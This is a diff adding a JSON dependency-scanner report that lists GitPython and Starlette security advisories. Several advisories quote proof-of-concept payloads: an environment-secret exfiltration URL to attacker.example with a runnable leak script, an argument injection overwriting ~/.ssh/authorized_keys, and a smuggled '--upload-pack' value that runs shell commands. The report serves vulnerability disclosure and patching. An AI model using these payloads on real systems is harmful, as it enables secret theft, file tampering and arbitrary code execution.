+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/ffcb5359e87619f4fe4a70a4aff5f08c5580ba97",
+            "https://github.com/gitpython-developers/GitPython/pull/2180",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-6p8h-3wgx-97gf"
+          ],
+          "PublishedDate": "2026-07-24T16:42:09Z",
+          "LastModifiedDate": "2026-07-24T16:42:09Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-94p4-4cq8-9g67",
+          "PkgName": "GitPython",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.52",
+            "UID": "b13af17e46d185d8"
+          },
+          "InstalledVersion": "3.1.52",
+          "FixedVersion": "3.1.55",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-94p4-4cq8-9g67",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:b5b8aca1a0e04e8cdf8d21b0765af84371b05c94ff67ca26c2cf5b021d64c33a",
+          "Title": "GitPython: Environment-variable exfiltration via Repo.create_remote() / Remote.add() URL (incomplete fix of GHSA-rwj8-pgh3-r573)",
+          "Description": "## Summary\n\nThe fix for [GHSA-rwj8-pgh3-r573](https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573) stopped `Repo.clone_from()` from running caller-supplied URLs through `os.path.expandvars()`, but it guarded only that one caller. `Remote.create()` — reached from the public `Repo.create_remote()` and its `Remote.add()` alias — still passes an attacker-influenceable URL through `Git.polish_url()` with the default `expand_vars=True`. A URL such as `http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git` is expanded server-side to embed the hosting process's environment secret, written into `.git/config`, and then transmitted to the attacker's host on the next `fetch`/`pull`. This is the same primitive and same \"import repository from URL\" threat model the advisory describes, via the sibling caller the fix missed.\n\n## Root Cause\n\nFix commit [`8ac5a305`](https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2) added an `expand_vars` parameter to `Git.polish_url()` (default `True`) and used `expand_vars=False` only in `Repo._clone()` ([`git/repo/base.py:1455`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/repo/base.py#L1455)). The shared helper's dangerous default was left in place, and the other callers were not updated.\n\n[`git/remote.py:811`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/remote.py#L811), `Remote.create`:\n\n```python\nurl = Git.polish_url(url)                 # expand_vars=True -\u003e os.path.expandvars(url)\nif not allow_unsafe_protocols:\n    Git.check_unsafe_protocols(url)       # https:// carrying the secret passes\nrepo.git.remote(scmd, \"--\", name, url, **kwargs)   # expanded URL written to .git/config\n```\n\n`check_unsafe_protocols()` runs *after* expansion here, so it rejects an `ext::` payload but does nothing about an `https://` URL that carries an expanded secret in its path or host — the disclosure primitive.\n\nThe same unguarded call also sits at [`git/objects/submodule/base.py:611`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/objects/submodule/base.py#L611) (`Submodule.add`), which writes the expanded URL into `.gitmodules` (a tracked file) and `.git/config`.\n\n## Steps to Reproduce\n\n### Prerequisites\n\n- Python 3.9+\n- `git` on `PATH` (for the fetch step)\n- GitPython 3.1.53 (installed below)\n\n### Step 1: Install GitPython 3.1.53 in a clean venv\n\n```bash\nmkdir /tmp/gp-remote-poc \u0026\u0026 cd /tmp/gp-remote-poc\npython3 -m venv venv\n./venv/bin/pip install gitpython==3.1.53\n```\n\n### Step 2: Write the PoC\n\n```bash\ncat \u003e poc.py \u003c\u003c'PYEOF'\n#!/usr/bin/env python3\n\"\"\"Env-var exfiltration via Repo.create_remote() URL. Sentinel data only.\"\"\"\nimport http.server\nimport os\nimport tempfile\nimport threading\n\nimport git\n\nprint(\"gitpython version:\", git.__version__)\n\n# Sentinel standing in for a process secret such as AWS_SECRET_ACCESS_KEY.\nSENTINEL = \"leaked-a1b2c3-SENTINEL-do-not-use\"\nos.environ[\"GP_SENTINEL_SECRET\"] = SENTINEL\n\n# Local HTTP server standing in for attacker.example.\ncaptured = []\n\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        captured.append(self.path)\n        self.send_response(404)\n        self.end_headers()\n\n    def log_message(self, *a):\n        pass\n\n\nsrv = http.server.HTTPServer((\"127.0.0.1\", 0), Handler)\nport = srv.server_address[1]\nthreading.Thread(target=srv.serve_forever, daemon=True).start()\n\n# Attacker-controlled URL handed to an \"import from URL\" feature.\nattacker_url = \"http://127.0.0.1:%d/steal/${GP_SENTINEL_SECRET}/repo.git\" % port\n\n\ndef norm(s):  # display the ephemeral listener port as a stable placeholder\n    return s.replace(\"127.0.0.1:%d\" % port, \"127.0.0.1:PORT\")\n\n\nprint(\"attacker-supplied URL :\", norm(attacker_url))\n\nrepo = git.Repo.init(tempfile.mkdtemp(prefix=\"gp-victim-\"))\nremote = repo.create_remote(\"evil\", attacker_url)   # public API\n\nstored = repo.remote(\"evil\").url\nprint(\"stored remote URL     :\", norm(stored))\nprint(\"SENTINEL in git config:\", SENTINEL in stored)\n\ntry:\n    remote.fetch()          # transmits the expanded URL to the attacker host\nexcept Exception:\n    pass                    # fetch fails after the request is already sent\n\nsrv.shutdown()\nover_network = any(SENTINEL in p for p in captured)\nprint(\"HTTP paths received   :\", [norm(p) for p in captured])\nprint(\"SENTINEL over network :\", over_network)\n\nprint()\nif SENTINEL in stored and over_network:\n    print(\"VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host\")\nelif SENTINEL in stored:\n    print(\"VULNERABLE: env-var expanded into stored git-config URL\")\nelse:\n    print(\"not reproduced\")\nPYEOF\n```\n\n### Step 3: Run it\n\n```bash\ncd /tmp/gp-remote-poc \u0026\u0026 ./venv/bin/python poc.py\n```\n\nExpected output (the listener's ephemeral port is shown as `PORT`):\n\n```\ngitpython version: 3.1.53\nattacker-supplied URL : http://127.0.0.1:PORT/steal/${GP_SENTINEL_SECRET}/repo.git\nstored remote URL     : http://127.0.0.1:PORT/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git\nSENTINEL in git config: True\nHTTP paths received   : ['/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git/info/refs?service=git-upload-pack']\nSENTINEL over network : True\n\nVULNERABLE: env-var expanded into stored URL AND transmitted to attacker host\n```\n\nThe `${GP_SENTINEL_SECRET}` token in the supplied URL is replaced with the environment value both in the stored `.git/config` URL and in the request that reaches the attacker-controlled host.\n\n## Suggested Fix\n\nPass `expand_vars=False` at the remaining URL callers, matching the clone fix:\n\n- `git/remote.py` `Remote.create`: `url = Git.polish_url(url, expand_vars=False)`\n- `git/objects/submodule/base.py` `Submodule.add`: `url = Git.polish_url(url, expand_vars=False)`\n\nMore robustly, flip the `Git.polish_url()` default to `expand_vars=False` (env-var expansion on a URL is never desirable for network remotes) and require callers that genuinely normalize local paths to opt in.\n\n## Cleanup\n\n```bash\nrm -rf /tmp/gp-remote-poc\n```\n\n## Impact\n\nAny secret in the hosting process environment (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, CI/CD tokens) is disclosed to an attacker who controls a remote URL passed to `Repo.create_remote()` / `Remote.add()`. The secret is expanded into `.git/config` immediately and transmitted over the network (DNS + HTTP) on the next `fetch`/`pull`/`remote update`. This is the documented \"import repository from URL\" attacker model of GHSA-rwj8-pgh3-r573 — CI servers, git-hosting mirrors, and dependency scanners — applied to the add-a-remote flow, which the clone-only fix did not cover. The same disclosure reaches `.gitmodules` (a committable file) via `Submodule.add()`.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/863417457a0633db7ea5aed4fd01e0b291a41162",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.55",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-94p4-4cq8-9g67"
+          ],
+          "PublishedDate": "2026-07-24T21:45:16Z",
+          "LastModifiedDate": "2026-07-24T21:45:16Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-fjr4-x663-mwxc",
+          "PkgName": "GitPython",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.52",
+            "UID": "b13af17e46d185d8"
+          },
+          "InstalledVersion": "3.1.52",
+          "FixedVersion": "3.1.54",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-fjr4-x663-mwxc",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:06624e3757a248cf28b8bb79690c5807d5229dd544bc4ef4faeebd5920e950f3",
+          "Title": "GitPython: Arbitrary file overwrite via git diff --output argument injection in Diffable.diff (key- and value-controlled)",
+          "Description": "## Summary\n`Diffable.diff()` forwards `**kwargs` straight into `diff`/`diff_tree` with **no** `check_unsafe_options` guard. `Diffable` is mixed into `Commit`, `Tree`, `IndexFile`, and `Submodule`, giving a broad surface. `git diff --output=\u003cpath\u003e` writes real patch content to an attacker-chosen path, enabling arbitrary file overwrite.\n\n## Root Cause\n`diff.py:188-283` builds and runs the diff command with no `check_unsafe_options` anywhere in the method (grep-confirmed). Additionally `diff.py:265` does `args.insert(0, other)`, placing the caller-supplied `other` ref BEFORE the `--` separator, so a value of `--output=/path` is parsed by git as an option — a value-only control path requiring no kwarg key.\n\n## Impact\nOverwrite/corrupt any file at process privilege with attacker-chosen path (e.g. `~/.ssh/authorized_keys`, configs, lockfiles). Content is real diff/patch bytes (attacker-influenced). Per the skill's rule, controlling WHICH file is overwritten = I:H regardless of content constraints.\n\n## Proof of Concept\n```python\n# Key-control:\ncommit.diff(other_commit, output='/home/app/.ssh/authorized_keys')   # victim overwritten with diff (105 bytes verified)\n# Value-control (attacker controls only the ref string):\ncommit.diff(other='--output=/home/app/.ssh/authorized_keys')          # 14-byte victim -\u003e 146 bytes of diff-tree output\n```\n\n## Attack Chain\n1. Entry (value-control): `commit.diff(other=\u003cuser ref\u003e)` with `other = \"--output=/home/app/.ssh/authorized_keys\"`. Guard: none in `Diffable.diff`. Bypass proof: no `check_unsafe_options` in the method body (grep); `other` inserted pre-`--` at diff.py:265.\n2. Sink: `git diff-tree \u003csha\u003e --output=/home/app/.ssh/authorized_keys -r ...` -\u003e git opens+truncates the target then writes diff content. Impact: overwrite/corrupt any file at process privilege (attacker chooses the path). Verified argv and victim overwrite live.\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): both key-control (`output=`) and value-control (`other='--output=...'`) overwrote a victim file with real diff-tree content; argv confirmed `['git','diff-tree','\u003csha\u003e','--output=/victim','-r',...]`. This is the same value-control model GHSA-956x deemed fix-worthy for `iter_commits(rev='--output=')` — but `diff` is a distinct, unguarded sink NOT touched by that fix.\n\n## Affected Versions\n`\u003c= 3.1.53`\n\n## Suggested Fix\nAdd `check_unsafe_options` to `Diffable.diff` (mirroring `iter_commits`/`archive`), and/or place `--end-of-options` before the `other` ref so it cannot be parsed as an option.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+              "V3Score": 8.1
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/1d51b891d7f236044a6aa17498ec682b63dad6e6",
+            "https://github.com/gitpython-developers/GitPython/pull/2180",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-fjr4-x663-mwxc"
+          ],
+          "PublishedDate": "2026-07-24T16:41:20Z",
+          "LastModifiedDate": "2026-07-24T16:41:21Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-r9mr-m37c-5fr3",
+          "PkgName": "GitPython",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.52",
+            "UID": "b13af17e46d185d8"
+          },
+          "InstalledVersion": "3.1.52",
+          "FixedVersion": "3.1.54",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-r9mr-m37c-5fr3",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:7cfa700368e666a9826afe5e2cdfc61b090d6ee9143f9b6cfcce951f3fdfd51c",
+          "Title": "GitPython: Unsafe git option guard bypass via single-character kwarg value token smuggling enables arbitrary command execution",
+          "Description": "## Summary\nGitPython's `check_unsafe_options` guard (the control introduced by CVE-2026-42215 / GHSA-2f96 and hardened since) can be bypassed for **every** guarded method (`clone`/`clone_from`, `fetch`/`pull`/`push`, `ls_remote`, `iter_commits`, `blame`, `archive`) by smuggling an option token inside the VALUE of a single-character kwarg. In the default `allow_unsafe_options=False` configuration this yields arbitrary command execution via `--upload-pack`.\n\n## Root Cause\nThe guard builds its candidate option list from kwarg KEYS only: `_option_candidates([], {\"n\":\"--upload-pack=\u003ccmd\u003e\"})` returns `['-n']` (cmd.py:1042-1046 derives the candidate from the key, never the value). `-n` is not on the denylist, so `check_unsafe_options` passes. But `transform_kwarg('n', value, split_single_char_options=True)` (cmd.py:1600-1606) emits **two** argv tokens `['-n', '--upload-pack=\u003ccmd\u003e']`. git then parses the second token as `--upload-pack` and executes the attacker-supplied command. The guard never inspects the value that becomes a separate argv token.\n\n## Impact\nArbitrary OS command execution as the host process (via `--upload-pack`) in the default configuration, affecting all guarded methods since they all build candidates through the name-only `_option_candidates`.\n\n## Proof of Concept\n```python\nfrom git import Repo\nRepo.clone_from(bare_repo, out_dir, n=\"--upload-pack=touch /tmp/ACE;git-upload-pack\")\n# /tmp/ACE created -\u003e ACE. Direct-name form upload_pack=\"...\" is correctly BLOCKED.\n```\nFile-write variant on a guarded revision command: `iter_commits('HEAD', g='--output=/path')` -\u003e candidate `['-g']` passes, argv `['-g','--output=/path']`, victim file truncated.\n\n## Attack Chain\n1. Entry: app forwards a user-supplied options dict -\u003e `Repo.clone_from(url, path, n=\"--upload-pack=touch /tmp/ACE;git-upload-pack\")`. Guard: `check_unsafe_options(options=_option_candidates([], kwargs), unsafe=unsafe_git_clone_options)` at base.py. Bypass proof: `_option_candidates([], {\"n\":\"--upload-pack=...\"})` -\u003e `['-n']` (key-only), not on denylist -\u003e no UnsafeOptionError (verified live).\n2. Transform: `transform_kwarg('n', value, split_single_char_options=True)` -\u003e `['-n', '--upload-pack=touch /tmp/ACE;git-upload-pack']`. Guard: none (guard already passed on name-only candidate). Bypass proof: verified transform emits two tokens.\n3. Sink: `git clone -n --upload-pack='touch ...;git-upload-pack' -- \u003csrc\u003e \u003cdst\u003e`; git parses and runs the second token. Impact: ACE (marker created, verified end-to-end).\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): `_option_candidates` returns key-only candidate `['-n']`; `transform_kwargs` emits the smuggled `--upload-pack=` token; clone_from with the payload created the marker file; the direct-name `upload_pack=` form raised UnsafeOptionError. All prior bypasses (GHSA-rpm5 underscore key, GHSA-2f96 long-option abbreviation, GHSA-v396 joined short option, GHSA-x2qx multi-before-split) are BLOCKED on HEAD — this is a distinct kwarg-value-\u003eseparate-token vector.\n\n## Affected Versions\n`\u003c= 3.1.53`\n\n## Suggested Fix\nMake `_option_candidates` also emit candidates derived from single-character kwarg VALUES when `split_single_char_options` is in effect, OR run `check_unsafe_options` over the fully-transformed argv rather than the reconstructed name-only candidate list.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.8
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/e8d0fbf774d1f6baa3b481adfe48bd262e43b453",
+            "https://github.com/gitpython-developers/GitPython/pull/2180",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-r9mr-m37c-5fr3"
+          ],
+          "PublishedDate": "2026-07-24T16:42:57Z",
+          "LastModifiedDate": "2026-07-24T16:42:57Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54283",
+          "VendorIDs": [
+            "GHSA-82w8-qh3p-5jfq"
+          ],
+          "PkgName": "starlette",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/starlette@1.2.0",
+            "UID": "50bf7abfa4e5acd6"
+          },
+          "InstalledVersion": "1.2.0",
+          "FixedVersion": "1.3.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54283",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:ac976786a5f1ae9d2b22d4d3cee32f29049b1c155ff5445cad9e60261a9d2060",
+          "Title": "starlette: Starlette: request.form() limits silently ignored for application/x-www-form-urlencoded enable DoS",
+          "Description": "Starlette is a lightweight ASGI framework/toolkit. From 0.4.1 until 1.3.1, request.form() accepts max_fields and max_part_size to bound resource consumption while parsing form data. These limits are enforced for multipart/form-data, but silently ignored for application/x-www-form-urlencoded. An unauthenticated attacker can therefore send a urlencoded body with an arbitrarily large number of fields or an arbitrarily large field, even when the application configured limits it believed would apply. This vulnerability is fixed in 1.3.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-54283",
+            "https://github.com/Kludex/starlette",
+            "https://github.com/Kludex/starlette/security/advisories/GHSA-82w8-qh3p-5jfq",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54283",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54283"
+          ],
+          "PublishedDate": "2026-06-22T18:16:46.943Z",
+          "LastModifiedDate": "2026-06-26T19:16:55.75Z"
+        }
+      ]
+    },
+    {
+      "Target": "afritech/docker/Dockerfile.api",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 20,
+        "Failures": 0
+      }
+    },
+    {
+      "Target": "deploy/staging/Dockerfile.api",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 20,
+        "Failures": 0
+      }
+    }
+  ]
+}
